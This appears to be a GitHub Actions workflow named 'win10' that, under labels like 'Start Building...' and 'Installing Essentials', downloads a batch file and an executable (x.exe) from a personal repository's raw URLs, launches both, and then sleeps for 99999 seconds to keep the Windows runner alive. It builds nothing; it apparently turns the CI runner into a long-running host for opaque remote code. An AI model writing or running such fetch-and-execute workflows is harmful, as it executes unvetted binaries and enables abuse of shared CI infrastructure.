name: win10

on:
  workflow_dispatch:

jobs:
  build:
    name: Start Building...
    runs-on: windows-latest
    timeout-minutes: 360
    
    steps:
      - name: Downloading & Installing Essentials
        run: |
          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/Downloads.bat" -OutFile "Downloads.bat"

      - name: run x.exe
        run: |
          $url = "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.exe"
          $destination = "C:\x.exe"
          Invoke-WebRequest -Uri $url -OutFile $destination
          Start-Process -FilePath $destination
                  
        
      - name: Downloads
        run: cmd /c Downloads.bat
        
      - name: Time Counter
        run: sleep 99999

        
